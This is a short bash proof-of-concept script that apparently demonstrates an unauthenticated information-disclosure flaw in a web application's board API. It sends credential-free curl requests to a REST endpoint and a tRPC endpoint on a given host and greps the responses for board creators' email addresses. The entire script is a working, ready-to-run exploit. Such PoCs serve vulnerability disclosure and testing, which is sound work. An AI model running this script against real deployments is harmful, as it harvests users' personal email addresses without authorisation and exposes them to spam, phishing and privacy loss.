#!/usr/bin/env bash
# Unauthenticated board-creator email disclosure. No credentials sent.
HOST="${1:-http://localhost:7575}"
echo "# REST (simplest):"
curl -s "$HOST/api/boards" | tee /dev/stderr | grep -o '"email":"[^"]*"' || true
echo; echo "# tRPC:"
curl -s "$HOST/api/trpc/board.getAllBoards?batch=1&input=%7B%220%22%3A%7B%22json%22%3Anull%7D%7D" \
  | grep -o '"email":"[^"]*"' || true
